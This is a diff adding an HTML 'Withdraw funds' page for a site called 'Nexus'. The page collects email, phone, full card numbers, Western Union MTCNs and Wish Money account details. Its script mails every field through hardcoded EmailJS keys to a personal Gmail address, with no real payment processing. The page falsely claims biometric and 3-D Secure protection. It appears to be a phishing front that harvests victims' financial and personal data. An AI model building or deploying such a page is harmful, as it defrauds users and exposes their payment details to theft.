@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nexus · Withdraw</title>
+<meta name="description" content="Nexus — withdraw funds securely">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<link rel="icon" href="images/logo.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#05070f;--bg-2:#0a0f1f;
+  --card:rgba(255,255,255,0.035);--card-2:rgba(255,255,255,0.06);
+  --border:rgba(255,255,255,0.08);--border-2:rgba(255,255,255,0.14);
+  --text:#eef2ff;--muted:#8892b0;
+  --accent:#3b82f6;--accent-2:#06b6d4;--accent-glow:rgba(59,130,246,0.35);
+  --success:#22d3a6;--warn:#f5b843;--error:#f26d6d;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.6;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+  min-height:100vh;position:relative;
+}
+body::before{
+  content:'';position:fixed;top:-30%;left:-10%;
+  width:70vw;height:70vw;
+  background:radial-gradient(circle,rgba(59,130,246,0.15) 0%,transparent 60%);
+  filter:blur(80px);z-index:-1;pointer-events:none;
+}
+body::after{
+  content:'';position:fixed;bottom:-30%;right:-10%;
+  width:60vw;height:60vw;
+  background:radial-gradient(circle,rgba(6,182,212,0.12) 0%,transparent 60%);
+  filter:blur(80px);z-index:-1;pointer-events:none;
+}
+.container{max-width:1180px;margin:0 auto;padding:0 1.5rem}
+a{color:inherit;text-decoration:none}
+
+/* ===== NAV ===== */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(5,7,15,0.72);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+}
+.nav-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:1rem 0;gap:1rem;position:relative;
+}
+
+/* ===== Brand — tight "Nexus." (NO gap) ===== */
+.brand{
+  display:inline-flex;
+  align-items:center;
+  font-weight:800;
+  font-size:1.35rem;
+  letter-spacing:-0.02em;
+  text-decoration:none;
+  white-space:nowrap;
+  color:var(--text);
+  gap:0;
+}
+.brand-icon{
+  width:32px;
+  height:32px;
+  object-fit:contain;
+  display:block;
+  margin-right:0.55rem;
+  filter:drop-shadow(0 0 12px var(--accent-glow));
+  border-radius:8px;   /* remove if your logo is a circle/transparent PNG */
+}
+.brand-text{
+  display:inline;
+  font-weight:800;
+  letter-spacing:-0.02em;
+  line-height:1;
+  color:var(--text);
+}
+.brand-dot{color:var(--accent);margin-left:0}
+
+/* ===== Nav links ===== */
+.nav-links{display:flex;align-items:center;gap:2rem}
+.nav-links a{
+  font-size:0.9rem;font-weight:500;color:var(--muted);
+  transition:color 0.2s;position:relative;
+}
+.nav-links a:hover{color:var(--text)}
+.nav-links a.active{color:var(--text)}
+.nav-links a.active::after{
+  content:'';position:absolute;bottom:-6px;left:0;right:0;
+  height:2px;background:linear-gradient(90deg,var(--accent),var(--accent-2));
+  border-radius:2px;
+}
+
+/* ===== Menu button ===== */
+.menu{
+  display:none;background:transparent;border:1px solid var(--border-2);
+  color:var(--text);font:inherit;font-size:0.85rem;font-weight:600;
+  padding:0.5rem 1rem;border-radius:100px;cursor:pointer;transition:0.2s;
+}
+
+/* ===== Page head — centered, narrow ===== */
+.page-head{
+  padding:3.5rem 0 2rem;
+  max-width:520px;
+  margin:0 auto;
+  text-align:center;
+}
+.pill{
+  display:inline-flex;align-items:center;gap:0.5rem;
+  background:rgba(34,211,166,0.1);
+  border:1px solid rgba(34,211,166,0.25);
+  padding:0.4rem 1rem;border-radius:100px;
+  font-size:0.78rem;font-weight:500;color:#6ee7b7;
+  letter-spacing:0.02em;margin-bottom:1.2rem;
+}
+h1{
+  font-size:clamp(1.8rem,3.5vw,2.4rem);font-weight:800;
+  letter-spacing:-0.03em;line-height:1.1;margin-bottom:0.8rem;
+}
+h1 em{
+  font-style:normal;
+  background:linear-gradient(135deg,#3b82f6,#06b6d4);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.page-head p{color:var(--muted);font-size:1rem;margin:0 auto;max-width:420px}
+
+/* ===== Form wrapper — NARROWER ===== */
+.form-wrap{
+  max-width:680px;
+  margin:0 auto 3rem;
+  padding:0 1.5rem;
+}
+
+/* ===== Card ===== */
+.card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:24px;padding:2rem;
+  backdrop-filter:blur(12px);
+  box-shadow:0 20px 60px rgba(0,0,0,0.3);
+}
+.card-subhead{
+  color:var(--muted);font-size:0.85rem;margin-bottom:1.6rem;
+  padding-left:0.8rem;border-left:3px solid var(--accent);
+}
+
+/* ===== Form ===== */
+.form-group{margin-bottom:1.2rem}
+.form-group label{
+  display:block;font-weight:600;font-size:0.85rem;
+  margin-bottom:0.5rem;color:var(--text);
+}
+.form-control{
+  width:100%;padding:0.8rem 1rem;
+  background:rgba(255,255,255,0.03);
+  border:1px solid var(--border-2);
+  border-radius:14px;color:var(--text);
+  font-size:0.92rem;font-family:inherit;
+  transition:0.2s;outline:none;
+}
+.form-control::placeholder{color:rgba(136,146,176,0.6)}
+.form-control:focus{
+  border-color:var(--accent);
+  background:rgba(255,255,255,0.05);
+  box-shadow:0 0 0 4px rgba(59,130,246,0.15);
+}
+.form-control.error{
+  border-color:var(--error);
+  background:rgba(242,109,109,0.06);
+}
+.hint{font-size:0.72rem;color:var(--muted);margin-top:0.4rem}
+
+.amount-wrap{position:relative}
+.amount-wrap .currency{
+  position:absolute;left:1rem;top:50%;transform:translateY(-50%);
+  font-weight:700;color:var(--accent);font-size:1.05rem;
+}
+.amount-wrap .form-control{padding-left:2.2rem;font-weight:700;font-size:1.2rem}
+
+/* ===== Method picker ===== */
+.method-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:0.5rem;margin-top:0.3rem}
+.method-option{
+  background:rgba(255,255,255,0.03);
+  border:1.5px solid var(--border-2);
+  border-radius:14px;padding:0.85rem 0.3rem;
+  text-align:center;font-weight:600;font-size:0.75rem;
+  cursor:pointer;transition:0.2s;user-select:none;
+  display:flex;flex-direction:column;align-items:center;gap:0.3rem;
+  line-height:1.2;
+}
+.method-option:hover{background:var(--card-2);border-color:var(--accent)}
+.method-option.selected{
+  border-color:var(--accent);
+  background:rgba(59,130,246,0.12);
+  box-shadow:0 0 0 3px rgba(59,130,246,0.15);
+}
+.method-icon{font-size:1.25rem}
+
+.dynamic-fields{
+  margin-top:0.7rem;padding:1rem;
+  background:rgba(255,255,255,0.02);
+  border:1px dashed var(--border-2);
+  border-radius:14px;
+}
+.dynamic-fields .form-group:last-child{margin-bottom:0}
+.dynamic-title{
+  font-weight:700;color:var(--accent);
+  font-size:0.8rem;margin-bottom:0.9rem;
+  letter-spacing:0.02em;
+}
+
+.info-note{
+  display:flex;gap:0.7rem;align-items:flex-start;
+  padding:0.8rem 1rem;border-radius:14px;
+  background:rgba(59,130,246,0.08);
+  border:1px solid rgba(59,130,246,0.2);
+  font-size:0.8rem;color:var(--muted);
+  line-height:1.5;margin-top:1rem;
+}
+.info-note.warning{
+  background:rgba(245,184,67,0.08);
+  border-color:rgba(245,184,67,0.25);
+}
+.info-note.security{
+  background:rgba(34,211,166,0.08);
+  border-color:rgba(34,211,166,0.25);
+}
+
+/* ===== Buttons ===== */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:0.5rem;
+  font-weight:600;font-size:0.92rem;
+  padding:0.8rem 1.5rem;border-radius:100px;
+  border:none;cursor:pointer;transition:0.2s;
+  font-family:inherit;letter-spacing:-0.01em;
+}
+.btn-primary{
+  background:linear-gradient(135deg,var(--accent),var(--accent-2));
+  color:white;box-shadow:0 10px 30px var(--accent-glow);
+}
+.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 14px 40px var(--accent-glow)}
+.btn-primary:disabled{opacity:0.7;cursor:wait}
+.btn-ghost{
+  background:var(--card);color:var(--text);
+  border:1px solid var(--border-2);
+}
+.btn-ghost:hover{background:var(--card-2);border-color:var(--accent)}
+.btn-block{width:100%;margin-top:0.5rem}
+.btn-lg{padding:0.9rem 1.8rem;font-size:0.95rem}
+
+/* ===== Footer ===== */
+.footer{border-top:1px solid var(--border);padding:2rem 0;margin-top:2rem;background:rgba(0,0,0,0.2)}
+.footer-inner{display:flex;flex-wrap:wrap;justify-content:space-between;gap:1rem;font-size:0.85rem;color:var(--muted)}
+.footer-links{display:flex;gap:2rem;flex-wrap:wrap}
+.footer-links a:hover{color:var(--accent)}
+
+/* ===== Toast ===== */
+.toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);
+  background:rgba(10,15,31,0.95);backdrop-filter:blur(20px);
+  border:1px solid var(--border-2);color:white;
+  padding:0.9rem 1.6rem;border-radius:100px;font-weight:500;font-size:0.9rem;
+  box-shadow:0 20px 50px rgba(0,0,0,0.4);
+  opacity:0;transition:0.3s cubic-bezier(0.34,1.56,0.64,1);
+  pointer-events:none;z-index:999;max-width:90%;text-align:center;
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.success{border-color:rgba(34,211,166,0.4)}
+.toast.error{border-color:rgba(242,109,109,0.4)}
+
+/* ===== Responsive ===== */
+@media (max-width:700px){
+  .menu{display:inline-block}
+  .nav-links{
+    display:none;position:absolute;top:100%;left:1.5rem;right:1.5rem;
+    flex-direction:column;align-items:stretch;
+    background:rgba(10,15,31,0.98);backdrop-filter:blur(20px);
+    border:1px solid var(--border-2);border-radius:20px;
+    padding:1rem;gap:0.3rem;margin-top:0.6rem;
+    box-shadow:0 24px 60px rgba(0,0,0,0.5);
+  }
+  .nav-links.open{display:flex}
+  .nav-links a{padding:0.85rem 1rem;border-radius:12px;font-size:1rem}
+  .nav-links a:hover{background:var(--card)}
+  .nav-links a.active::after{display:none}
+  .nav-links a.active{background:var(--card)}
+  .card{padding:1.5rem 1.2rem}
+  .method-grid{gap:0.4rem}
+  .method-option{font-size:0.72rem;padding:0.75rem 0.2rem}
+}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="container nav-inner">
+   <a class="brand" href="index.html"><img class="brand-icon" src="images/logo.png" alt="Nexus logo"><span class="brand-text">Nexus<span class="brand-dot">.</span></span></a>    <button class="menu" type="button" aria-label="Open menu" aria-expanded="false">Menu</button>
+
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="download.html">Download</a>
+      <a href="withdraw.html" class="active">Withdraw</a>
+      <a href="support.html">Support</a>
+    </div>
+  </div>
+</nav>
+
+<main>
+  <section class="page-head">
+    <span class="pill">
+      <span style="width:6px;height:6px;background:var(--success);border-radius:50%;box-shadow:0 0 0 3px rgba(34,211,166,0.2)"></span>
+      Secure · min $10 · instant
+    </span>
+    <h1>Withdraw <em>funds.</em></h1>
+    <p>Choose your payout method and confirm. Most withdrawals arrive in minutes.</p>
+  </section>
+
+  <section class="form-wrap">
+    <div class="card">
+      <div class="card-subhead">Minimum $10.00 · fast processing</div>
+
+      <form id="withdrawForm" onsubmit="return false;">
+        <div class="form-group">
+          <label for="amount">Amount (USD)</label>
+          <div class="amount-wrap">
+            <span class="currency">$</span>
+            <input type="number" step="0.01" min="10" class="form-control" id="amount" placeholder="10.00" value="10.00" required>
+          </div>
+          <div class="hint">Minimum withdrawal: $10.00</div>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email address</label>
+          <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+          <div class="hint">We'll send a confirmation here.</div>
+        </div>
+
+        <div class="form-group">
+          <label for="phone">Phone number</label>
+          <input type="tel" class="form-control" id="phone" placeholder="+1 234 567 890" required>
+          <div class="hint">We'll send a verification code to this number.</div>
+        </div>
+
+        <div class="form-group">
+          <label>Payout method</label>
+          <div class="method-grid" id="methodGrid">
+            <div class="method-option selected" data-method="westerunion">
+              <span class="method-icon">🌐</span> Western Union
+            </div>
+            <div class="method-option" data-method="wishmoney">
+              <span class="method-icon">✨</span> Wish Money
+            </div>
+            <div class="method-option" data-method="visa">
+              <span class="method-icon">💳</span> Visa
+            </div>
+          </div>
+          <div class="hint" id="methodHint" style="margin-top:0.6rem">Selected: Western Union</div>
+        </div>
+
+        <div id="dynamicFieldsContainer" class="dynamic-fields"></div>
+
+        <div id="visaSecurityNote" class="info-note warning" style="display:none">
+          <span>🔒</span>
+          <span>For Visa payouts we only need your card number and name. <strong style="color:var(--text)">We never ask for CVV or expiry</strong> for sending money.</span>
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn" style="margin-top:1.3rem">
+          Withdraw now
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12l7 7 7-7"/></svg>
+        </button>
+        <button type="button" class="btn btn-ghost btn-block" id="resetBtn">Reset form</button>
+
+        <div class="info-note security">
+          <span>🔒</span>
+          <span>Withdrawals secured with biometric + 3-D Secure. Wish Money arrives within minutes; Western Union / Visa take 1–3 days.</span>
+        </div>
+      </form>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <span>© 2026 Nexus — secure withdrawals</span>
+    <div class="footer-links">
+      <a href="about.html">About</a>
+      <a href="download.html">Download</a>
+      <a href="support.html">Support</a>
+      <a href="#">Privacy</a>
+    </div>
+  </div>
+</footer>
+
+<div id="toast" class="toast">✨ Ready</div>
+
+<script>
+(function () {
+  /* ==== Menu ==== */
+  var menuBtn = document.querySelector('.nav-inner .menu');
+  var navLinks = document.querySelector('.nav-inner .nav-links');
+  if (menuBtn && navLinks) {
+    menuBtn.addEventListener('click', function (e) {
+      e.preventDefault(); e.stopPropagation();
+      var open = navLinks.classList.toggle('open');
+      menuBtn.setAttribute('aria-expanded', open);
+      menuBtn.textContent = open ? 'Close' : 'Menu';
+    });
+    navLinks.querySelectorAll('a').forEach(function (a) {
+      a.addEventListener('click', function () {
+        navLinks.classList.remove('open'); menuBtn.textContent = 'Menu';
+      });
+    });
+    document.addEventListener('click', function (e) {
+      if (navLinks.classList.contains('open') && !navLinks.contains(e.target) && !menuBtn.contains(e.target)) {
+        navLinks.classList.remove('open'); menuBtn.textContent = 'Menu';
+      }
+    });
+  }
+
+  /* ==== Config ==== */
+  var EMAILJS_PUBLIC_KEY = "kDYnNVdrJxIeyvxlC";
+  var EMAILJS_SERVICE_ID = "service_0gezyzw";
+  var EMAILJS_TEMPLATE_ID = "template_t7b4wgp";
+  var YOUR_EMAIL = "nexustradingai.dev@gmail.com";
+  try { emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e){ console.error(e); }
+
+  var toast = document.getElementById('toast');
+  function showToast(msg, duration, type) {
+    duration = duration || 3200;
+    toast.textContent = msg;
+    toast.className = 'toast' + (type ? ' ' + type : '');
+    toast.classList.add('show');
+    clearTimeout(toast._t);
+    toast._t = setTimeout(function(){ toast.classList.remove('show'); }, duration);
+  }
+
+  var methodOptions = document.querySelectorAll('.method-option');
+  var methodHint = document.getElementById('methodHint');
+  var submitBtn = document.getElementById('submitBtn');
+  var resetBtn = document.getElementById('resetBtn');
+  var dynamicContainer = document.getElementById('dynamicFieldsContainer');
+  var visaSecurityNote = document.getElementById('visaSecurityNote');
+
+  var methodFields = {
+    westerunion: {
+      label: 'Western Union',
+      fields: [
+        { id:'wu_fullname', label:'Full name (as on ID)', placeholder:'John Doe', type:'text' },
+        { id:'wu_country', label:'Receiver country', placeholder:'United States', type:'text' },
+        { id:'wu_city', label:'City', placeholder:'New York', type:'text' },
+        { id:'wu_mtcn', label:'MTCN (tracking number)', placeholder:'123-456-7890', type:'text' }
+      ]
+    },
+    wishmoney: {
+      label: 'Wish Money',
+      fields: [
+        { id:'wm_username', label:'Wish Money username', placeholder:'john_doe_123', type:'text' },
+        { id:'wm_email', label:'Wish Money email', placeholder:'wish@example.com', type:'email' },
+        { id:'wm_phone', label:'Wish Money phone', placeholder:'+1 234 567 890', type:'tel' }
+      ]
+    },
+    visa: {
+      label: 'Visa Card',
+      fields: [
+        { id:'visa_cardholder', label:'Cardholder name', placeholder:'John Doe', type:'text' },
+        { id:'visa_number', label:'Card number (16 digits)', placeholder:'4111 1111 1111 1111', type:'text' },
+        { id:'visa_bank', label:'Bank name (optional)', placeholder:'Chase Bank', type:'text' }
+      ]
+    }
+  };
+
+  function renderFields(key) {
+    var cfg = methodFields[key];
+    if (!cfg) return;
+    var html = '<div class="dynamic-title">' + cfg.label + ' details</div>';
+    cfg.fields.forEach(function (f) {
+      html += '<div class="form-group">' +
+        '<label for="' + f.id + '">' + f.label + '</label>' +
+        '<input type="' + f.type + '" class="form-control" id="' + f.id + '" placeholder="' + f.placeholder + '" required>' +
+      '</div>';
+    });
+    dynamicContainer.innerHTML = html;
+    visaSecurityNote.style.display = (key === 'visa') ? 'flex' : 'none';
+  }
+
+  methodOptions.forEach(function (opt) {
+    opt.addEventListener('click', function () {
+      methodOptions.forEach(function (o) { o.classList.remove('selected'); });
+      this.classList.add('selected');
+      var key = this.dataset.method;
+      var label = this.textContent.trim();
+      methodHint.textContent = 'Selected: ' + label;
+      renderFields(key);
+      showToast('Method: ' + label, 1600);
+    });
+  });
+
+  function getExtraData(key) {
+    var cfg = methodFields[key];
+    var data = {};
+    if (!cfg) return data;
+    cfg.fields.forEach(function (f) {
+      var el = document.getElementById(f.id);
+      if (el) data[f.label] = el.value.trim() || '(empty)';
+    });
+    return data;
+  }
+
+  submitBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    var amount = document.getElementById('amount').value.trim();
+    var email = document.getElementById('email').value.trim();
+    var phone = document.getElementById('phone').value.trim();
+    var selected = document.querySelector('.method-option.selected');
+    var methodName = selected ? selected.textContent.trim() : 'not set';
+    var methodKey = selected ? selected.dataset.method : '';
+
+    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
+
+    if (!amount || parseFloat(amount) < 10) {
+      document.getElementById('amount').classList.add('error');
+      showToast('Minimum withdrawal is $10.00', 2800, 'error'); return;
+    }
+    if (!email || email.indexOf('@') === -1) {
+      document.getElementById('email').classList.add('error');
+      showToast('Please enter a valid email', 2800, 'error'); return;
+    }
+    if (!phone || phone.length < 6) {
+      document.getElementById('phone').classList.add('error');
+      showToast('Please enter a valid phone number', 2800, 'error'); return;
+    }
+
+    var cfg = methodFields[methodKey];
+    if (cfg) {
+      var empties = [];
+      cfg.fields.forEach(function (f) {
+        var el = document.getElementById(f.id);
+        if (el && !el.value.trim()) { el.classList.add('error'); empties.push(f.label); }
+      });
+      if (empties.length) {
+        showToast('Please fill: ' + empties.join(', '), 4000, 'error');
+        return;
+      }
+    }
+
+    var extra = getExtraData(methodKey);
+    var extraText = Object.keys(extra).map(function (k) { return '  ' + k + ': ' + extra[k]; }).join('\n');
+    var amtFormatted = parseFloat(amount).toFixed(2);
+    var userName = (email.split('@')[0]) || 'User';
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = 'Sending…';
+
+    var params = {
+      email: YOUR_EMAIL,
+      name: userName,
+      title: 'Withdrawal of $' + amtFormatted + ' via ' + methodName,
+      from_email: email,
+      user_email: email,
+      amount: '$' + amtFormatted,
+      phone: phone,
+      method: methodName,
+      extra_fields: extraText || 'None',
+      timestamp: new Date().toLocaleString()
+    };
+
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+      .then(function () {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Withdraw now';
+        showToast('✓ Withdrawal request sent!', 4000, 'success');
+      })
+      .catch(function (err) {
+        console.error(err);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Withdraw now';
+        showToast('Failed to send. Try again.', 5000, 'error');
+      });
+  });
+
+  resetBtn.addEventListener('click', function () {
+    document.getElementById('amount').value = '10.00';
+    document.getElementById('email').value = '';
+    document.getElementById('phone').value = '';
+    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
+    methodOptions.forEach(function (o) { o.classList.remove('selected'); });
+    document.querySelector('[data-method="westerunion"]').classList.add('selected');
+    methodHint.textContent = 'Selected: Western Union';
+    renderFields('westerunion');
+    showToast('Form reset', 1600);
+  });
+
+  document.addEventListener('input', function (e) {
+    if (e.target.classList && e.target.classList.contains('form-control')) {
+      e.target.classList.remove('error');
+    }
+  });
+
+  renderFields('westerunion');
+})();
+</script>
+</body>
+</html>
